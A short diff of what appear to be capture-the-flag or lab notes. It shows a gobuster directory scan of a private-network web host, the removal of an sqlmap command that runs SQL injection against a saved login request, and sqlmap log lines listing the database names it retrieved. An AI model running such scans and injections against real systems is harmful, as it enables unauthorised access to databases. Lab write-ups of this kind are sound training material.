@@ -24,8 +24,6 @@ gobuster dir -u http://192.168.0.32/ -w /usr/share/wordlists/dirbuster/directory
 /teacher (Status: 200)
 /teacher.html (Status: 200)
 
-sqlmap -r eclasslogin -dbs
-
 [19:08:03] [INFO] retrieved: INFOSEC100
 [19:08:30] [INFO] retrieved: eclass
 [19:08:49] [INFO] retrieved: mysql
